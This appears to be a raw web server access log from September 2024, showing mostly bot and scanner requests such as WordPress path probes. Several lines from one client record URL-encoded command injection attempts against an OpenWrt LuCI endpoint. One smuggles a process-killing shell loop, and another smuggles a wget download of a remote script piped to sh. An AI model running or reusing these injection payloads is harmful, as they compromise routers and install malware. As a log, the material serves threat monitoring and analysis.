114.160.71.84 - - [24/Sep/2024:18:16:57 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 1821 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.0.0 Mobile/15E148 Safari/604.1"
185.224.128.47 - - [24/Sep/2024:18:19:15 +0000] "GET / HTTP/1.1" 302 50480 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
141.98.11.122 - - [24/Sep/2024:18:19:35 +0000] "GET / HTTP/1.1" 302 8289 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
43.128.100.206 - - [24/Sep/2024:18:24:08 +0000] "GET / HTTP/1.1" 302 8291 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.128.100.206 - - [24/Sep/2024:18:24:11 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "http://5.161.235.50:80" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
185.224.128.59 - - [24/Sep/2024:18:30:17 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 302 50494 "-" "Go-http-client/1.1"
185.224.128.59 - - [24/Sep/2024:18:30:17 +0000] "GET /cgi-bin/luci/;stok=/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 404 27 "http://5.161.235.50:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60" "Go-http-client/1.1"
185.224.128.59 - - [24/Sep/2024:18:30:17 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 302 50509 "-" "Go-http-client/1.1"
185.224.128.59 - - [24/Sep/2024:18:30:17 +0000] "GET /cgi-bin/luci/;stok=/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 404 27 "http://5.161.235.50:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60" "Go-http-client/1.1"
185.191.126.213 - - [24/Sep/2024:19:16:16 +0000] "GET / HTTP/1.1" 302 50509 "-" "-"
34.162.198.32 - - [24/Sep/2024:19:18:11 +0000] "GET / HTTP/1.1" 302 50510 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.162.198.32 - - [24/Sep/2024:19:18:11 +0000] "GET / HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.162.198.32 - - [24/Sep/2024:19:18:11 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.162.198.32 - - [24/Sep/2024:19:18:11 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.162.198.32 - - [24/Sep/2024:19:18:11 +0000] "GET / HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.162.198.32 - - [24/Sep/2024:19:18:11 +0000] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.162.198.32 - - [24/Sep/2024:19:18:12 +0000] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.162.198.32 - - [24/Sep/2024:19:18:12 +0000] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
